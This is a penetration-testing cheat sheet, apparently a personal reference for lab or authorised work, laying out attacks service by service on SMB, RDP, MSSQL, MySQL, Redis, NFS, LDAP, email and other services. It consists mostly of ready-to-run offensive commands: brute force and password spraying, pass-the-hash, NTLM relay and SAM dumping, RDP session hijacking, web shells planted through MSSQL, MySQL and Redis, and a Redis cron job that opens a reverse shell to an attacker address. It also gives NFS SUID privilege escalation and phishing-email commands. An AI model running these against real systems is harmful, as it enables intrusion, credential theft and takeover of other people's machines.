# Attacking Common Services

#Services #SMB #FTP #SSH #RDP #MSSQL #MySQL #NFS #SNMP #WinRM #DNS #Email #Enumeration #BruteForce

## What is this?

Per-service playbook — enumeration, anonymous/null access, brute force, exploitation, and post-access commands for the most common network services. For AD-specific attacks see [[Active Directory Attacks]].

---

## Tools

| Tool | Service(s) | Purpose |
|---|---|---|
| `nmap` | All | Port scan, version detection, NSE scripts |
| `crackmapexec` | SMB, WinRM, MSSQL, SSH | Auth, exec, spray, enum |
| `impacket-psexec` / `smbexec` | SMB | Remote shell via SMB |
| `impacket-ntlmrelayx` | SMB | NTLM relay → SAM dump / command exec |
| `smbclient` | SMB | Interactive share browser |
| `smbmap` | SMB | List shares and permissions |
| `enum4linux-ng` | SMB/RPC | AD/Samba enumeration |
| `rpcclient` | RPC/SMB | RPC enumeration (users, groups, shares) |
| `evil-winrm` | WinRM | Interactive PS shell, PTH, file transfer |
| `hydra` | FTP, SSH, RDP, SMTP, MySQL, VNC | Multi-service brute force |
| `medusa` | FTP, SSH, MSSQL | Multi-service brute force |
| `crowbar` | RDP | RDP-specific brute force |
| `impacket-mssqlclient` | MSSQL | Interactive MSSQL client |
| `sqsh` | MSSQL, MySQL | CLI DB client (Linux) |
| `redis-cli` | Redis | Interactive Redis client |
| `ldapsearch` | LDAP | LDAP query tool |
| `ldapdomaindump` | LDAP | AD LDAP dump → HTML/JSON |
| `windapsearch` | LDAP | AD-targeted LDAP queries |
| `smtp-user-enum` | SMTP | SMTP user enumeration (VRFY/RCPT) |
| `o365spray` | SMTP/O365 | O365 user enum and password spray |
| `swaks` | SMTP | Send/test emails via CLI |
| `onesixtyone` | SNMP | Community string brute force |
| `snmpwalk` | SNMP | SNMP tree walk |
| `dig` / `fierce` / `subfinder` | DNS | DNS enum and subdomain discovery |
| `showmount` | NFS | List NFS exports |
| `rsync` | Rsync | List/download/upload rsync modules |
| `vncviewer` | VNC | Connect to VNC sessions |
| `xfreerdp` | RDP, VNC | Connect with PTH support |
| `MSF ipmi_dumphashes` | IPMI | Unauthenticated IPMI hash dump |
| `hashcat -m 7300` | IPMI | Crack IPMI RAKP hashes |

---

## SMB — TCP 139/445

### Enumeration

```bash
# Nmap
nmap -sV -sC -p 139,445 10.10.10.10

# Null/anonymous session — list shares
smbclient -N -L //10.10.10.10
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u guest

# Authenticated share listing
smbclient -U user%Password123 -L //10.10.10.10
smbmap -H 10.10.10.10 -u user -p Password123

# Enumerate users, shares, groups, policies
enum4linux -a 10.10.10.10
enum4linux-ng -A 10.10.10.10

# CME — enum logged-on users / shares / sessions
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123!' --loggedon-users
crackmapexec smb 10.10.10.10 -u user -p Password123 --shares
crackmapexec smb 10.10.10.10 -u '' -p '' --shares       # null session

# RPCclient (null session)
rpcclient -U '' -N 10.10.10.10
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser 0x3e8
```

### Connect and Browse

```bash
# Connect to share
smbclient //10.10.10.10/Finance -U user%Password123

# Mount share (Linux)
sudo mkdir /mnt/smb
sudo mount -t cifs -o username=user,password=Password123 //10.10.10.10/Finance /mnt/smb

# Mount with credential file
mount -t cifs //10.10.10.10/Finance /mnt/smb -o credentials=/tmp/creds
# /tmp/creds:
# username=user
# password=Password123
# domain=.
```

### Search Mounted Share

```bash
# Find files with "cred" in name
find /mnt/smb/ -name '*cred*'
grep -rn 'password' /mnt/smb/ --include='*.txt' --include='*.xml' --include='*.ini'
```

### Brute Force

```bash
# CME spray
crackmapexec smb 10.10.10.10 -u users.txt -p 'Company01!' --local-auth

# Nmap brute
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10
```

### Remote Execution

```bash
# CME exec (smbexec, wmiexec, atexec)
crackmapexec smb 10.10.10.10 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# PSExec (impacket — requires admin + writable share)
impacket-psexec administrator:'Password123!'@10.10.10.10
impacket-smbexec administrator:'Password123!'@10.10.10.10

# Pass-the-Hash
crackmapexec smb 10.10.10.10 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
impacket-psexec administrator@10.10.10.10 -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE
xfreerdp /v:10.10.10.10 /u:administrator /pth:2B576ACBE6BCFDA7294D6BD18041B8FE

# Dump SAM
crackmapexec smb 10.10.10.10 -u Administrator -p 'Password123!' --sam
```

### NTLM Relay

```bash
# 1. Disable SMB in Responder config (SMB = Off)
# 2. Run Responder to capture challenge
sudo responder -I eth0

# 3. Relay to target — dump SAM by default
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.146

# 3b. Relay + run command
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.146 -c 'powershell -e <b64>'
```

---

## FTP — TCP 21

### Enumeration

```bash
nmap -sV -sC -p 21 10.10.10.10
nmap -p 21 --script ftp-anon,ftp-brute 10.10.10.10
```

### Anonymous Login

```bash
ftp 10.10.10.10
# username: anonymous  password: (blank or email)

# Or with client
ftp -n 10.10.10.10
ftp> user anonymous
ftp> ls
ftp> get file.txt
ftp> put shell.php       # upload if writable
```

### Brute Force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp
```

### FTP Bounce Attack

Use a vulnerable FTP server to port scan internal hosts:

```bash
nmap -Pn -v -n -p 80 -b anonymous:password@10.10.10.213 172.17.0.2
```

---

## SSH — TCP 22

### Enumeration

```bash
nmap -sV -sC -p 22 10.10.10.10
ssh-audit 10.10.10.10          # check supported algorithms / version
```

### Brute Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4

medusa -u root -P passwords.txt -h 10.10.10.10 -M ssh

# CME
crackmapexec ssh 10.10.10.10 -u users.txt -p passwords.txt
```

### Connect / Key-Based

```bash
# Password auth
ssh user@10.10.10.10

# Private key
ssh -i id_rsa user@10.10.10.10
chmod 600 id_rsa         # required

# Specify older algorithms (legacy targets)
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o HostKeyAlgorithms=ssh-rsa user@10.10.10.10
```

### SSH Tunneling (Pivoting)

```bash
# Local forward — reach 192.168.1.10:80 via attacker:8080
ssh -L 8080:192.168.1.10:80 user@10.10.10.10

# Dynamic SOCKS proxy (proxychains)
ssh -D 1080 user@10.10.10.10
# then: proxychains nmap -sT -Pn 192.168.1.10

# Remote forward — expose attacker port on target
ssh -R 4444:127.0.0.1:4444 user@10.10.10.10
```

---

## Email — SMTP/IMAP/POP3

| Port | Protocol | Notes |
|---|---|---|
| TCP/25 | SMTP | Unencrypted (server-to-server) |
| TCP/587 | SMTP | Submission (STARTTLS) |
| TCP/465 | SMTPS | Encrypted |
| TCP/110 | POP3 | Unencrypted |
| TCP/995 | POP3S | Encrypted |
| TCP/143 | IMAP | Unencrypted |
| TCP/993 | IMAPS | Encrypted |

### Enumeration

```bash
# Nmap
nmap -Pn -sV -sC -p 25,110,143,465,587,993,995 10.10.10.10

# MX records
host -t MX target.com
dig mx target.com | grep -v '^;'

# Open relay check
nmap -p 25 --script smtp-open-relay 10.10.10.10

# SMTP user enumeration
smtp-user-enum -M RCPT -U users.txt -D target.com -t 10.10.10.10
smtp-user-enum -M VRFY -U users.txt -t 10.10.10.10
```

### SMTP Manual Commands

```bash
telnet 10.10.10.10 25
EHLO test
VRFY admin@target.com        # verify if user exists
RCPT TO:<admin@target.com>   # another enum method
```

### Office 365 Enumeration / Spray

```bash
# Validate domain on O365
python3 o365spray.py --validate --domain target.com

# Enumerate users
python3 o365spray.py --enum -U users.txt --domain target.com

# Password spray
python3 o365spray.py --spray -U users.txt -p 'March2024!' --count 1 --lockout 1 --domain target.com
```

### Brute Force (POP3/IMAP)

```bash
hydra -L users.txt -P passwords.txt -f 10.10.10.10 pop3
hydra -L users.txt -P passwords.txt -f 10.10.10.10 imap
```

### Send Email via SMTP (swaks)

```bash
# Send test email (open relay abuse / phishing)
swaks --to victim@target.com --from admin@target.com --server 10.10.10.10 --body "Click here" --header "Subject: Test"

# With attachment
swaks --to victim@target.com --from admin@target.com --server 10.10.10.10 --attach malicious.docx
```

---

## DNS — TCP/UDP 53

### Enumeration

```bash
# Nmap
nmap -p 53 -sV -sC 10.10.10.10

# Zone transfer (AXFR)
dig AXFR @10.10.10.10 target.com
dig AXFR @ns1.target.com target.com
host -l target.com 10.10.10.10          # alternative

# Subdomain brute
fierce --domain target.com
subfinder -d target.com -v
subbrute target.com -s names.txt -r resolvers.txt
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Record lookup
host -t A mail.target.com
host -t MX target.com
host -t NS target.com
dig any target.com
```

### Subdomain Takeover

```bash
# Check if a subdomain CNAME points to unclaimed resource
host sub.target.com            # if CNAME → service provider
# If provider shows "unclaimed" page → register the external resource

# Tool
# https://github.com/EdOverflow/can-i-take-over-xyz
```

### DNS Cache Poisoning (ettercap)

```bash
# 1. Edit /etc/ettercap/etter.dns — add A record for target domain pointing to attacker IP
# 2. In ettercap: Hosts > Scan for Hosts
# 3. Set targets
# 4. Plugins > Manage Plugins > dns_spoof
```

---

## RDP — TCP 3389

### Enumeration

```bash
nmap -Pn -sV -sC -p 3389 10.10.10.10
nmap -p 3389 --script rdp-enum-encryption 10.10.10.10

# Metasploit
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.10.10.10
run
```

### Brute Force

```bash
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -c 'Password123'
hydra -L users.txt -p 'Password123' rdp://10.10.10.10
```

### Connect

```bash
# Linux clients
xfreerdp /v:10.10.10.10 /u:administrator /p:'Password123'
xfreerdp /v:10.10.10.10 /u:administrator /p:'Password123' /drive:kali,/tmp   # share /tmp as drive
rdesktop -u administrator -p Password123 10.10.10.10

# Pass-the-Hash (requires DisableRestrictedAdmin = 0)
xfreerdp /v:10.10.10.10 /u:administrator /pth:NTLMHASH

# Enable PTH for RDP on target (requires existing admin shell)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Session Hijacking (SYSTEM required)

```bash
# List sessions
query user

# Hijack session (no password needed with SYSTEM)
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>

# If not SYSTEM — create a service to run tscon
sc.exe create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start hijack
```

---

## WinRM — TCP 5985 (HTTP) / 5986 (HTTPS)

### Enumeration

```bash
nmap -sV -p 5985,5986 10.10.10.10
crackmapexec winrm 10.10.10.10 -u user -p Password123
```

### Connect

```bash
# evil-winrm (Linux)
evil-winrm -i 10.10.10.10 -u administrator -p 'Password123'

# Pass-the-Hash
evil-winrm -i 10.10.10.10 -u administrator -H NTLMHASH

# Pass-the-Key (Kerberos)
evil-winrm -i 10.10.10.10 -u administrator -k -r DOMAIN.LOCAL

# PowerShell (Windows)
$s = New-PSSession -ComputerName 10.10.10.10 -Credential (Get-Credential)
Enter-PSSession $s
```

### File Transfer via evil-winrm

```bash
# Upload
upload /tmp/payload.exe C:\Windows\Temp\payload.exe

# Download
download C:\Users\Administrator\Desktop\flag.txt /tmp/
```

---

## MSSQL — TCP 1433

### Enumeration

```bash
nmap -Pn -sV -sC -p 1433 10.10.10.10
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config 10.10.10.10

# CME
crackmapexec mssql 10.10.10.10 -u users.txt -p passwords.txt
```

### Connect

```bash
# Impacket (Windows or SQL auth)
impacket-mssqlclient administrator:'Password123!'@10.10.10.10
impacket-mssqlclient DOMAIN/user:'Password123!'@10.10.10.10 -windows-auth

# sqsh (Linux)
sqsh -S 10.10.10.10 -U sa -P 'Password123' -h
sqsh -S 10.10.10.10 -U '.\julio' -P 'Password123' -h    # local Windows account

# sqlcmd (Windows)
sqlcmd -S 10.10.10.10 -U sa -P 'Password123' -y 30 -Y 30
```

### Enumeration Queries

```sql
-- List databases
SELECT name FROM master.dbo.sysdatabases
GO

-- Use database and list tables
USE [dbname]
GO
SELECT name FROM sys.tables
GO

-- Current user and role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Check impersonation targets
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Linked servers
SELECT srvname, isremote FROM sysservers
GO
```

### Command Execution (xp_cmdshell)

```sql
-- Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- Execute
EXEC xp_cmdshell 'whoami'
GO

-- On linked server
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKEDSERVER]
GO
```

### File Read

```sql
-- OPENROWSET (no OLE needed)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
GO
```

### File Write (OLE Automation)

```sql
-- Enable OLE
EXECUTE sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

-- Write web shell
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\inetpub\wwwroot\shell.asp', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<%eval request("cmd")%>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### Hash Stealing (requires Responder/SMB server)

```sql
-- Force outbound SMB connection → capture NTLMv2 hash
EXEC master..xp_dirtree '\\10.10.14.5\share'
GO
EXEC master..xp_subdirs '\\10.10.14.5\share'
GO
```

### Impersonation

```sql
-- Impersonate sa (or other login)
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

---

## MySQL — TCP 3306

### Enumeration

```bash
nmap -sV -sC -p 3306 10.10.10.10
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-brute 10.10.10.10
```

### Connect

```bash
# Linux
mysql -u root -p'Password123' -h 10.10.10.10
mysql -u root -h 10.10.10.10       # no password prompt

# sqsh
sqsh -S 10.10.10.10 -U root -P 'Password123'
```

### Enumeration Queries

```sql
SHOW DATABASES;
USE dbname;
SHOW TABLES;
SELECT * FROM users LIMIT 10;

-- Current user and privileges
SELECT user();
SELECT @@version;
SHOW GRANTS FOR 'root'@'localhost';

-- Check file write privileges (empty = no restriction)
SHOW VARIABLES LIKE 'secure_file_priv';
```

### File Read / Write

```sql
-- Read local file
SELECT LOAD_FILE('/etc/passwd');

-- Write file (requires secure_file_priv = '' and write access)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### Brute Force

```bash
hydra -L users.txt -P passwords.txt mysql://10.10.10.10
crackmapexec mssql 10.10.10.10 -u users.txt -p passwords.txt    # works for MySQL too in some CME builds
medusa -u root -P passwords.txt -h 10.10.10.10 -M mysql
```

---

## NFS — TCP/UDP 2049

### Enumeration

```bash
nmap -sV -p 111,2049 10.10.10.10
nmap -p 111 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.10

# List available exports
showmount -e 10.10.10.10
```

### Mount and Access

```bash
# Mount export
sudo mkdir /mnt/nfs
sudo mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock

# List files
ls -la /mnt/nfs/

# Unmount
sudo umount /mnt/nfs
```

### Privilege Escalation via NFS

```bash
# If no_root_squash is set — root on attacker = root on NFS share
# Check /etc/exports on target for no_root_squash

# As root on attacker, copy SUID bash to share
sudo cp /bin/bash /mnt/nfs/
sudo chmod u+s /mnt/nfs/bash

# On target — execute SUID bash
/mnt/nfs/bash -p     # → root shell
```

---

## SNMP — UDP 161

### Enumeration

```bash
nmap -sU -p 161 10.10.10.10
nmap -sU -p 161 --script snmp-info,snmp-brute 10.10.10.10

# Walk with public community string
snmpwalk -v2c -c public 10.10.10.10
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1    # system info OID
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.4.1.77.1.2.25  # Windows users

# onesixtyone — brute community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10

# braa — fast bulk walk
braa public@10.10.10.10:.1.3.6.*
```

### Useful OIDs

| OID | Description |
|---|---|
| `1.3.6.1.2.1.1` | System info (hostname, OS, uptime) |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.2.1.6.13.1.3` | Open TCP ports |
| `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |

```bash
# Targeted walk
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2    # processes
snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2    # software
```

---

## RPC — TCP 111 / 135

### Enumeration

```bash
# Linux RPC (portmapper)
nmap -sV -p 111 10.10.10.10
rpcinfo -p 10.10.10.10

# Windows RPC (MSRPC)
nmap -sV -p 135 10.10.10.10
impacket-rpcdump @10.10.10.10        # dump registered RPC endpoints

# rpcclient (SMB RPC — null session)
rpcclient -U '' -N 10.10.10.10
rpcclient> srvinfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo          # password policy
rpcclient> queryuser 0x3e8
rpcclient> netshareenumall
```

---

## LDAP — TCP 389 / 636 (LDAPS)

### Enumeration

```bash
nmap -sV -p 389,636 10.10.10.10
nmap -p 389 --script ldap-rootdse,ldap-search 10.10.10.10

# Anonymous bind — dump base DN info
ldapsearch -H ldap://10.10.10.10 -x -s base namingcontexts

# Anonymous bind — dump everything
ldapsearch -H ldap://10.10.10.10 -x -b "DC=domain,DC=local"

# Authenticated dump
ldapsearch -H ldap://10.10.10.10 -x -D "user@domain.local" -w 'Password123' -b "DC=domain,DC=local"

# Dump all users
ldapsearch -H ldap://10.10.10.10 -x -D "user@domain.local" -w 'Password123' -b "DC=domain,DC=local" "(objectClass=person)" sAMAccountName mail

# ldapdomaindump — HTML/JSON output, great for AD
ldapdomaindump -u 'domain\user' -p 'Password123' 10.10.10.10 -o /tmp/ldap/

# windapsearch — AD-specific queries
python3 windapsearch.py -d domain.local -u user -p Password123 --users
python3 windapsearch.py -d domain.local -u user -p Password123 --groups
python3 windapsearch.py -d domain.local -u user -p Password123 --da    # domain admins
```

### Null / Anonymous Bind Check

```bash
# If this returns data — anonymous bind allowed
ldapsearch -H ldap://10.10.10.10 -x -b "" -s base "(objectclass=*)" "*" +
```

---

## Redis — TCP 6379

### Enumeration

```bash
nmap -sV -p 6379 10.10.10.10
nmap -p 6379 --script redis-info 10.10.10.10

# Connect (no auth)
redis-cli -h 10.10.10.10
redis-cli -h 10.10.10.10 -a 'password'    # with auth

# Basic recon inside redis-cli
INFO server
INFO keyspace
CONFIG GET *
KEYS *
GET <key>
```

### Unauthenticated File Write (RCE)

If Redis runs as root or has write access to sensitive dirs:

```bash
# Method 1 — Write SSH authorized_keys
redis-cli -h 10.10.10.10
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> SET payload "\n\nssh-rsa AAAA...your-public-key...\n\n"
> SAVE

# Then SSH in
ssh -i id_rsa root@10.10.10.10

# Method 2 — Write web shell (if web root is writable)
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE

# Method 3 — Write cron job
> CONFIG SET dir /var/spool/cron/crontabs
> CONFIG SET dbfilename root
> SET payload "\n* * * * * bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n"
> SAVE
```

### Redis Master-Slave RCE (authenticated or post-auth)

```bash
# redis-rogue-server — loads a malicious .so module
# https://github.com/n0b0dyCN/redis-rogue-server
python3 redis-rogue-server.py --rhost 10.10.10.10 --lhost 10.10.14.5
```

---

## IPMI — UDP 623

### Enumeration

```bash
nmap -sU -p 623 10.10.10.10
nmap -sU -p 623 --script ipmi-version 10.10.10.10

# MSF — version and cipher detection
use auxiliary/scanner/ipmi/ipmi_version
set RHOSTS 10.10.10.10
run
```

### Hash Disclosure (Cipher 0 / anonymous auth)

```bash
# MSF — dump IPMI hashes (no auth required on vulnerable BMCs)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.10
set OUTPUT_JOHN_FILE /tmp/ipmi_hashes.txt
run

# Crack with hashcat (RAKP mode 7300)
hashcat -m 7300 /tmp/ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# Default credentials to try
# iDRAC:    root:calvin
# iLO:      Administrator:<factory-set>
# IPMI 2.0: admin:admin, ADMIN:ADMIN
```

> [!note] IPMI hashes are HMAC-SHA1 of the session challenge — crackable offline. Successful creds often reused for BMC web interface, SSH, or OS accounts.

---

## Rsync — TCP 873

### Enumeration

```bash
nmap -sV -p 873 10.10.10.10

# List available modules (shares)
rsync rsync://10.10.10.10/
rsync --list-only rsync://10.10.10.10/

# List files in a module
rsync --list-only rsync://10.10.10.10/module_name/
rsync --list-only rsync://user@10.10.10.10/module_name/
```

### Download / Upload

```bash
# Download entire module
rsync -av rsync://10.10.10.10/module_name /tmp/loot/

# Download with credentials
rsync -av rsync://user@10.10.10.10/module_name /tmp/loot/

# Upload file (if module is writable)
rsync -av /tmp/shell.php rsync://10.10.10.10/module_name/shell.php

# Upload SSH key (if module maps to home dir)
rsync -av ~/.ssh/id_rsa.pub rsync://10.10.10.10/module_name/.ssh/authorized_keys
```

---

## VNC — TCP 5900 / 5901+

VNC display numbers: display :0 → port 5900, display :1 → port 5901, etc.

### Enumeration

```bash
nmap -sV -p 5900-5910 10.10.10.10
nmap -p 5900 --script vnc-info,vnc-brute 10.10.10.10
```

### Brute Force

```bash
hydra -L users.txt -P passwords.txt vnc://10.10.10.10
hydra -s 5901 -P passwords.txt 10.10.10.10 vnc        # non-default port

# Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 10.10.10.10
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Connect

```bash
# vncviewer (Linux)
vncviewer 10.10.10.10:5900
vncviewer 10.10.10.10:5900 -passwd /tmp/vncpasswd

# xfreerdp (supports VNC)
xfreerdp /v:10.10.10.10:5900

# Decode stored VNC password (DES-encrypted)
# If you find a .vnc or ~/.vnc/passwd file:
cat ~/.vnc/passwd | xxd
# Use metasploit post module or online decoders
use post/multi/gather/vnc_password_file
```

---

## Quick Reference — Ports

| Service | Port(s) | Protocol |
|---|---|---|
| FTP | 21 | TCP |
| SSH | 22 | TCP |
| SMTP | 25, 465, 587 | TCP |
| DNS | 53 | TCP/UDP |
| HTTP | 80 | TCP |
| POP3 | 110, 995 | TCP |
| RPC (portmapper) | 111 | TCP/UDP |
| IMAP | 143, 993 | TCP |
| SNMP | 161 | UDP |
| LDAP / LDAPS | 389, 636 | TCP |
| HTTPS | 443 | TCP |
| SMB | 139, 445 | TCP |
| MSRPC | 135 | TCP |
| MSSQL | 1433 | TCP |
| MySQL | 3306 | TCP |
| RDP | 3389 | TCP |
| NFS | 2049 | TCP/UDP |
| WinRM | 5985, 5986 | TCP |
| Redis | 6379 | TCP |
| VNC | 5900+ | TCP |
| Rsync | 873 | TCP |
| IPMI | 623 | UDP |

---

## Quick Reference — Common Brute Force Commands

| Service | Command |
|---|---|
| SMB | `crackmapexec smb <ip> -u users.txt -p pass.txt` |
| SSH | `hydra -L users.txt -P pass.txt ssh://<ip>` |
| FTP | `hydra -L users.txt -P pass.txt ftp://<ip>` |
| RDP | `crowbar -b rdp -s <ip>/32 -U users.txt -c pass` |
| WinRM | `crackmapexec winrm <ip> -u users.txt -p pass.txt` |
| MSSQL | `crackmapexec mssql <ip> -u users.txt -p pass.txt` |
| MySQL | `hydra -L users.txt -P pass.txt mysql://<ip>` |
| SMTP | `hydra -L users.txt -P pass.txt smtp://<ip>` |
| SNMP | `onesixtyone -c community-strings.txt <ip>` |
| VNC | `hydra -P pass.txt vnc://<ip>` |
| IPMI hashes | `use auxiliary/scanner/ipmi/ipmi_dumphashes` |
| LDAP anonymous | `ldapsearch -H ldap://<ip> -x -b "DC=x,DC=x"` |

---

*Created: 2026-03-02*
*Updated: 2026-05-13*
*Model: claude-sonnet-4-6*